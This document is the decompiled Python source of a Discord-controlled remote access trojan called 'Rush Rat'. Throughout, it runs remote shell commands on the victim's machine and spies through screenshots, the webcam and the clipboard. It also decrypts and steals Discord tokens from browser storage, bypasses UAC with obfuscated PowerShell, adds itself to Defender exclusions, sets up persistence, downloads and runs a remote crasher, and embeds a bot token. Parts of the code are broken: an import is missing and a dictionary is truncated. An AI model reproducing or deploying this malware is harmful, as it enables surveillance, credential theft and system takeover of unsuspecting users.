# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Drat.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import ctypes
import requests
from requests import get
import socket
import os
import discord
from discord.ext import commands
import pyautogui
import subprocess
import sys
import json
import platform
import pyperclip
import datetime
import win32console
import win32gui
import zipfile
import getpass
import cv2
import asyncio
import io
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import re
import win32com.client as wincl
import shutil
import numpy as np
import psutil
import wmi
import locale
import av
import winreg
token = 'MTExOTU5NzgzNDI1NDE1OTkzMg.G_aqFz.KKT8OY5q5rstLFboruhhzw3qmfqWGWXqAwOpS8'
darknosy = commands.Bot(command_prefix='$', intents=discord.Intents.all())
darknosy.remove_command('help')

def is_admin():
    admin = ctypes.windll.shell32.IsUserAnAdmin()
    return admin!= 0

@darknosy.event
async def on_ready():
    global channel_name  # inserted
    global admin  # inserted
    global guild_id  # inserted
    channel_name = None
    admin = ctypes.windll.shell32.IsUserAnAdmin()
    if admin == 0:
        admin = False
    else:  # inserted
        admin = True
    get_biggest_number = None
    guilds = darknosy.guilds
    guild_id = guilds[0].id
    guild = darknosy.get_guild(guild_id)
    all_channels = []
    guild_channels = guild.channels
    for channel in guild_channels:
        all_channels.append(channel.name)
    for i in range(len(all_channels)):
        if all_channels[i].startswith('session'):
            if get_biggest_number == None:
                get_biggest_number = all_channels[i]
            else:  # inserted
                if int(all_channels[i].split('-')[1]) > int(get_biggest_number.split('-')[1]):
                    get_biggest_number = all_channels[i]
                else:  # inserted
                    pass
        else:  # inserted
            pass
    if get_biggest_number!= None:
        channel = await guild.create_text_channel(f"session-{int(get_biggest_number.split('-')[1]) + 1}")
        channel_name = f"session-{int(get_biggest_number.split('-')[1]) + 1}"
    else:  # inserted
        channel_name = 'session-1'
        channel = await guild.create_text_channel(channel_name)
    ip = requests.get('https://api.ipify.org').text
    hostname = socket.gethostname()
    username = os.getlogin()
    time = os.popen('time /t').read().strip()
    working_dir = os.getcwd()
    console_visible = is_console_visible()
    embed = discord.Embed(title='Rush Rat', description='New Connection', color=986880)
    embed.add_field(name='IP', value=ip, inline=True)
    embed.add_field(name='PC Name', value=hostname, inline=True)
    embed.add_field(name='Username', value=username, inline=True)
    embed.add_field(name='Time', value=time, inline=True)
    embed.add_field(name='Session', value=channel_name, inline=True)
    embed.add_field(name='Current Directory', value=working_dir, inline=True)
    embed.add_field(name='Admin', value=admin, inline=True)
    embed.add_field(name='Console Hidden', value=not console_visible, inline=True)
    embed.set_footer(text='Made by DARKN0$Y')
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/559513113645547521/1103844777209901056/unnamed.jpg?width=220&height=220')
    channel_stuff = discord.utils.get(guild.channels, name=channel_name)
    channel_id = channel_stuff.id
    await guild.get_channel(channel_id).send(embed=embed, content='@everyone')
    status = 'github.com/darknosy'
    await darknosy.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))

@darknosy.event
async def on_command_error(ctx, error):
    try:
        await ctx.send(error)
    except:
        return None

@darknosy.command()
async def help(ctx):
    prefix = darknosy.command_prefix
    if ctx.channel.name!= channel_name:
        return
    embed = discord.Embed(title='Page 1/2', description='Page 1 of the command list.', color=986880)
    embed.add_field(name='Commands List Page 1/2', value=''.join(f'--> {prefix}help - Shows the command list\n--> {prefix}ping - Pings the bot\n--> {prefix}pc_info - Get details about the host machine\n--> {prefix}cd <directory> - Changes the working directory\n--> {prefix}cmd <command> - Runs a command on the host machine\n--> {prefix}download <file> - Downloads a file from the host machine\n--> {prefix}upload - Upload your files to the host machine\n--> {prefix}join - Bot joins voice channel\n--> {prefix}leave - Bot leaves voice channel if in one\n--> {prefix}messagebox <title> <message> - Shows a message box on the host machine\n--> {prefix}say <message> - Says the message you put after the command\n--> {prefix}uac_bypass - Bypasses UAC (DISABLE ANTI-VIRUS BEFORE)\n--> {prefix}ask_admin - Tries to request admin like a normal process\n--> {prefix}admin_check - Checks if the bot has admin\n--> {prefix}hide_check - Checks if the console is hidden\n--> {prefix}screenshot - Takes a screenshot of the host machine\n--> {prefix}webcam_pic - Takes a picture from the webcam\n--> {prefix}clipboard - Sends the most recent copied content in text'), inline=True)
    await ctx.send(embed=embed)
    embed = discord.Embed(title='Page 2/2', description='Page 2 of the command list.', color=986880)
    embed.add_field(name='Commands List Page 2/2', value=f'--> {prefix}hide - Hides the rat\n--> {prefix}unhide - Unhides the rat\n--> {prefix}exit - Makes the program close it self\n--> {prefix}delete <session_num> - Deletes the session of your choice (1, 2, 3, etc)/all\n--> {prefix}tokens - Gets all the tokens on the pc\n--> {prefix}thanos_crasher - Downloads Thanos Crasher and runs it\n--> {prefix}setup - hide + tokens + ask_admin + startup + screenshot\n--> {prefix}shutdown <message> - Shutdowns the host computer\n--> {prefix}startup_normal - Adds the rat to startup (normal)\n--> {prefix}startup_persistent - Adds the rat to startup (requires admin)\n--> {prefix}exclusion - Adds the rat to the windows defender exclusions', inline=True)
    await ctx.send(embed=embed)

@darknosy.command()
async def ping(ctx):
    if ctx.channel.name!= channel_name:
        return
    await ctx.send('Pong! ' + str(round(darknosy.latency * 1000)) + 'ms')

@darknosy.command()
async def uac_bypass(ctx):
    if ctx.channel.name!= channel_name:
        return
    command = f'Start-Process {__file__}'
    code = bytearray(command, 'utf-16-le')
    code = base64.b64encode(code).decode()
    setVar = 'Set-Variable -Name \'code\' -Value ' + f'\"{code}\";'
    final_command = '[STrinG]::Join( \'\', ([cHAr[]] (101 , 35 ,8 ,58 , 96, 2 ,15 ,7 ,8,14 , 57 , 109 , 109,4, 34,99 ,14 , 34,0 , 61 , 63, 40,30, 62 ,36 ,34 ,35 ,99,9,8 , 43,33, 44, 57 ,40,30,25,63,8, 44 , 0 ,101 , 109 , 22 , 30 ,52 , 30 , 57,40 ,32 , 99,36,34, 99, 32 ,40, 32 ,34 ,31, 20, 30 ,25 , 31, 40,44,0,16,22, 46, 34 , 35,59 ,8,63, 25, 16, 119 ,119 , 43, 63 ,34 , 32 , 15 ,44,30 ,8, 123,121 , 30, 25, 63 ,36 ,3,42 , 101 ,109, 106 , 37, 20, 121,116,14,117 , 4,58, 10,4 ,25, 98,52,38,59 ,34 , 10 ,39, 62, 121,11,37 , 40, 1,60,4 ,42 , 43 ,24 ,5, 25,6 , 8, 61, 61 ,63,6 , 102 ,30,1, 7, 11,1 ,116 , 116, 55, 20,11,58,24 , 32 ,21,32 , 102,123,40 , 40 ,121, 63,55 , 46 , 47 ,57,36, 126,34 ,125, 4,46, 20 ,9 , 26 , 14, 55 , 53 , 15,43, 6, 30 ,15, 102, 0,33 ,41,46 ,57 , 42 ,116, 117 , 46,125,25 ,1 ,44 ,124, 43 ,21 , 62, 23 , 4 ,5,1 ,44, 33,34 ,35,24, 6, 53 , 6, 60, 12 ,35 , 60 ,31 , 30 ,53 , 5 ,44, 5 ,102, 36, 34 , 44,124,123, 27,31, 15, 34,37,44 ,25 , 125 ,124, 8,62, 21 ,14 ,32, 11 , 125, 126 ,32,36 ,63 ,2, 5 ,11 ,44, 125 , 55 ,31, 33 ,63,11 , 60,11 ,31 , 24, 25 , 0 ,116 ,24 , 41, 59,117, 28, 7,59,6 ,4, 33,2, 123,127,39 ,123, 7 ,102 , 37,15, 59 , 14,59,10 ,20,23, 55, 43,6 ,102,46, 127,34 , 123, 117,12,37 ,23,59 , 26,60,30,9, 4, 38, 126,10,59 ,9 , 8 ,4 ,52 ,124 , 35 , 59 ,4, 7,10 ,58,38,116 , 7 ,116 ,33 , 5 ,120 ,126,43 ,127, 127 ,32, 30 ,41 , 59, 106 ,100 ,109,97, 22, 30,52, 62, 25 ,8 , 0 , 99 , 36 ,34 , 99, 14,2, 0,61 , 31, 40, 62 , 30,36 , 34,35, 99, 46 ,34,0 ,29,31,8 ,30, 30,4,2,3, 0,34 , 9 , 8 , 16 , 119, 119 ,9 , 40 , 14,34, 32,61,63,40 ,62 ,62, 109 ,100,109 ,49 ,109 , 11 , 34,63,40 ,44 ,46 ,5,54 , 35 , 8,58 ,96,2, 15, 7, 8, 14, 57 ,109,4, 34 ,99 ,30, 57 ,31, 40 ,44,0, 63 , 8,44 , 9 ,40,63,101, 109 ,105 , 18, 97 ,22, 30 ,52 , 30 ,25 ,8 , 0, 99,57 ,40 , 21,25,99, 40 ,35, 14 , 2,41 , 4, 3 ,10 ,16,119 , 119 , 44 , 30 , 46 , 36 , 4, 109 , 100,48 ,100 , 99,63,8 ,44, 9 , 25 ,2,8,35,41 , 101 , 109,100,109, 49 ,109 , 4 , 35 , 27, 34 , 6,8, 96 ,40, 53 ,61, 31 , 8, 62, 62 ,4,2 ,3) |% {[cHAr]( $_-bXor\"0x4d\" ) } ) ) |.( ([String]$verbOSEPRefeReNCE)[1,3]+\'x\'-JOin\'\')'
    subprocess.run(['powershell', setVar, final_command])
    await ctx.send('UAC Bypassed')
    os._exit(0)

@darknosy.command()
async def ask_admin(ctx):
    if ctx.channel.name!= channel_name:
        return
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
        await ctx.send('Asked for admin!')
    else:  # inserted
        await ctx.send('Already admin')

@darknosy.command()
async def admin_check(ctx):
    if ctx.channel.name!= channel_name:
        return
    await ctx.send('Checking if admin...')
    await ctx.send('```' + str(is_admin()) + '```')

@darknosy.command()
async def hide_check(ctx):
    if ctx.channel.name!= channel_name:
        return
    await ctx.send('Checking if console is hidden...')
    console_visible = True
    if subprocess.STARTUPINFO().dwFlags & subprocess.STARTF_USESHOWWINDOW:
        console_visible = False
    if console_visible:
        await ctx.send('```False```')
    else:  # inserted
        await ctx.send('```True```')

@darknosy.command()
async def screenshot(ctx):
    if ctx.channel.name!= channel_name:
        return
    await ctx.send('Taking screenshot...')
    image = pyautogui.screenshot()
    image.save('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')

@darknosy.command()
async def hide(ctx):
    await ctx.send('Hiding window... This has to make a new process so it might take a second.')
    text = f'powershell -c \"Start-Process -WindowStyle Hidden {__file__}\"'
    os.system(text)
    os._exit(0)

@darknosy.command()
async def unhide(ctx):
    await ctx.send('Showing window... This has to make a new process so it might take a second.')
    text = f'powershell -c \"Start-Process {__file__}\"'
    os.system(text)
    os._exit(0)

@darknosy.command()
async def cmd(ctx, *, command):
    if ctx.channel.name!= channel_name:
        return
    message = await ctx.send('Running command...')
    output = os.popen(command).read()
    if len(output) > 2000:
        bytes = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(bytes, 'output.txt'), content=f'Output was too long, so it was sent as a file. (Length: {len(output)}. Command ran: {command}')
        await message.delete()
    else:  # inserted
        if '```' in output:
            bytes = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(bytes, 'output.txt'), content=f'Output contained a codeblock, so it was sent as a file. (Length: {len(output)}. Command ran: {command}')
            await message.delete()
        else:  # inserted
            await message.edit(content=f'```{output}``` (Length: {len(output)}. Command ran: {command})')

@darknosy.command()
async def delete(ctx, session):
    if ctx.channel.name!= channel_name:
        return
    if session == 'all':
        guild = ctx.guild
        channels = guild.channels
        for channel in channels:
            if channel.name.startswith('session-'):
                await channel.delete()
        os._exit(0)
        return
    else:  # inserted
        guild = ctx.guild
        channels = guild.channels
        for channel in channels:
            if channel.name == 'session-' + session:
                if channel.name == channel_name:
                    await channel.delete()
                    os._exit(0)
                else:  # inserted
                    await channel.delete()
                    await ctx.send('Deleted channel: ' + channel.name)

@darknosy.command()
async def download(ctx):
    if ctx.channel.name!= channel_name:
        return
    file = ctx.message.attachments[0]
    file_link = file.url
    with open(file.filename, 'wb') as f:
        f.write(requests.get(file_link).content)
    await ctx.send(f'Downloaded file to {os.getcwd()}' + '\\' + file.filename)

@darknosy.command()
async def messagebox(ctx, title, *, message):
    if ctx.channel.name!= channel_name:
        return
    Message_box = ctypes.windll.user32.MessageBoxW
    Message_box(None, message, title, 0)

@darknosy.command()
async def say(ctx, *, message):
    if ctx.channel.name!= channel_name:
        return
    talk = wincl.Dispatch('SAPI.SpVoice')
    talk.Speak(message)
    await ctx.send(f'Said: {message}')

@darknosy.command()
async def cd(ctx, *, directory):
    if ctx.channel.name!= channel_name:
        return
    os.chdir(directory)
    await ctx.send(f'Changed directory to: {os.getcwd()}')

@darknosy.command()
async def startup_normal(ctx):
    if ctx.channel.name!= channel_name:
        return
    if is_admin():
        startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        file_name = __file__.split('\\')[(-1)]
        shutil.copyfile(__file__, os.path.join(startup_dir, file_name))
        await ctx.send('Added to startup!')
    else:  # inserted
        await ctx.send('You need to be an admin to do this!')

@darknosy.command()
async def startup_persistant(ctx):
    if ctx.channel.name!= channel_name:
        return
    if is_admin():
        task_name = 'Rush'
        os.system(f'schtasks /create /f /rl highest /sc onstart /tn {task_name} /tr \"\'cmd.exe\' /c powershell Start-Process -WindowStyle Hidden {__file__}\"')
        os.system('cls')
        await ctx.send('Added to startup!')
    else:  # inserted
        await ctx.send('You need to be an admin to do this!')

@darknosy.command()
async def exclusion(ctx):
    if ctx.channel.name!= channel_name:
        return
    if is_admin():
        os.system(f'powershell Add-MpPreference -ExclusionPath \"{__file__}\"')
        await ctx.send('Added to exclusions!')
    else:  # inserted
        await ctx.send('You need to be an admin to do this!')

@darknosy.command()
async def tokens(ctx):
    if ctx.channel.name!= channel_name:
        return
    tokens = get_tokens()
    for token in tokens:
        try:
            r = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token})
            user = r.json()
            user_info = user['username'] + '#' + user['discriminator']
            await ctx.send(f'Token: {token} | User: {user_info}')
        except:
            continue

@darknosy.command()
async def shutdown(ctx, *, message=None):
    if ctx.channel.name!= channel_name:
        return
    if message is None:
        raise commands.MissingRequiredArgument
    await ctx.send('Shutting down...')
    await asyncio.sleep(2)
    os.system(f'shutdown /s /t 0 /c \"{message}\"')

@shutdown.error
async def shutdown_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Please provide a shutdown message.')

@darknosy.command()
async def upload(ctx):
    if ctx.channel.name!= channel_name:
        return
    if is_admin():
        await ctx.send('Please select the file you want to upload.')
        try:
            message = await darknosy.wait_for('message', timeout=60, check=lambda m: m.author == ctx.author)
            if message.attachments:
                file = message.attachments[0]
                await file.save(file.filename)
                with open(file.filename, 'rb') as f:
                    await ctx.send(file=discord.File(f))
                await ctx.send('File uploaded successfully!')
            else:  # inserted
                await ctx.send('No file selected. Upload cancelled.')
        except asyncio.TimeoutError:
            await ctx.send('No response received. Upload cancelled.')
    await ctx.send('You need to be an admin to do this!')

@darknosy.command()
async def clipboard(ctx):
    if ctx.channel.name!= channel_name:
        return
    clipboard_content = pyperclip.paste()
    await ctx.send('Clipboard content: {}'.format(clipboard_content))

@darknosy.command()
async def exit(ctx):
    await ctx.send('Exiting...')
    await darknosy.logout()
    os._exit(0)

def take_webcam_picture():
    capture = cv2.VideoCapture(0)
    if not capture.isOpened():
        print('Failed to open webcam')
        return
    ret, frame = capture.read()
    if not ret:
        print('Failed to capture frame from webcam')
        return
    capture.release()
    cv2.destroyAllWindows()
    return frame
intents = discord.Intents.default()
intents.voice_states = True
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
client = discord.Client(intents=intents)

@darknosy.command()
async def webcam_pic(message):
    frame = take_webcam_picture()
    if frame is not None:
        output_file = 'webcam_picture.jpg'
        cv2.imwrite(output_file, frame)
        with open(output_file, 'rb') as f:
            picture = discord.File(f)
            await message.channel.send(file=picture)
            os.system('del webcam_picture.jpg')
intents = discord.Intents.default()
intents.typing = False
intents.presences = False

@darknosy.command()
async def join(ctx):
    if ctx.author.voice is None:
        await ctx.send('You are not connected to a voice channel.')
        return
    voice_channel = ctx.author.voice.channel
    voice_client = discord.utils.get(darknosy.voice_clients, guild=ctx.guild)
    if voice_client and voice_client.is_connected():
        await voice_client.move_to(voice_channel)
    else:  # inserted
        await voice_channel.connect()
    await ctx.send(f'Joined voice channel: {voice_channel}')

@darknosy.command()
async def leave(ctx):
    if ctx.channel.name!= channel_name:
        return
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send(f'Left voice channel: {voice_channel}')

@darknosy.command()
async def pc_info(ctx):
    if ctx.channel.name!= channel_name:
        return
    info = platform.uname()
    system = info.system
    release = info.release
    machine = info.machine
    language = locale.getlocale(locale.LC_CTYPE)[0]
    username = getpass.getuser()
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    cpu_percent = psutil.cpu_percent()
    memory_info = psutil.virtual_memory()
    memory_percent = memory_info.percent
    disk_usage = psutil.disk_usage('/')
    disk_percent = disk_usage.percent
    battery = psutil.sensors_battery()
    battery_percent = battery.percent if battery else 'N/A'
    battery_plugged = battery.power_plugged if battery else False
    volume = ctypes.windll.winmm.waveOutGetVolume(None)
    volume_percent = round(volume / 65535 * 100, 2)
    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    info_message = f'System: {system} {release} {machine}\n'
    info_message += f'Language: {language}\n'
    info_message += f'Username: {username}\n'
    info_message += f'PC Name: {hostname}\n'
    info_message += f'IP Address: {ip}\n'
    info_message += f'CPU Usage: {cpu_percent}%\n'
    info_message += f'Memory Usage: {memory_percent}%\n'
    info_message += f'Disk Usage: {disk_percent}%\n'
    info_message += f'Battery Percentage: {battery_percent}% (Plugged in: {battery_plugged})\n'
    info_message += f'Volume Level: {volume_percent}%\n'
    info_message += f'Current Time: {current_time}'
    await ctx.send(f'[*] Command successfully executed:\n```{info_message}```')

@darknosy.command()
async def thanos_crasher(ctx):
    url = 'https://github.com/DARKNOSY/Thanos-Crasher/releases/download/V0.5/Thanos-Crasher.zip'
    response = requests.get(url)
    zip_file_path = 'Thanos-Crasher.zip'
    with open(zip_file_path, 'wb') as zip_file:
        zip_file.write(response.content)
    extraction_path = 'Thanos-Crasher'
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(extraction_path)
    os.chdir(extraction_path)
    os.chdir('Thanos')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    os.startfile('Crasher.bat')
    await ctx.send('Thanos Crasher executed successfully.')
    os.remove(zip_file_path)

def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:(-16)].decode()
    return decrypted_pass

def get_key(path):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return
    with open(path, 'r', encoding='utf-8') as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def get_tokens():
    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    encrypt_regex = 'dQw4w9WgXcQ:[^\\\"]*'
    normal_regex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    baseurl = 'https://discord.com/api/v9/users/@me'
    tokens = []
    ids = []
    paths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': appdata + 'Vivaldi', 'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\', 'Chrome5': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', 'Epic Privacy Browser': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\', 'Microsoft Edge': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\', 'Uran': appdata + '
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(' ', '').lower()
        if 'cord' in path:
            if os.path.exists(roaming + f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ['log', 'ldb']:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypt_regex, line):
                            try:
                                token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_key(roaming + f'\\{disc}\\Local State'))
                            except:
                                token = 'ERROR'
                            r = requests.get(baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:  # inserted
            for file_name in os.listdir(path):
                if file_name[(-3):] not in ['log', 'ldb']:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(normal_regex, line):
                        r = requests.get(baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
    if os.path.exists(roaming + '\\Mozilla\\Firefox\\Profiles'):
        for path, _, files in os.walk(roaming + '\\Mozilla\\Firefox\\Profiles'):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(normal_regex, line):
                        r = requests.get(baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
    working = []
    for token in [*set(tokens)]:
        url = 'https://discord.com/api/v9/users/@me'
        r = requests.get(url, headers={'Authorization': token})
        if r.status_code == 200:
            working.append(token)
    return working

def is_console_visible():
    try:
        hwnd = win32console.GetConsoleWindow()
        return win32gui.IsWindowVisible(hwnd)
    except win32gui.error:
        return False
if __name__ == '__main__':
    darknosy.run(token)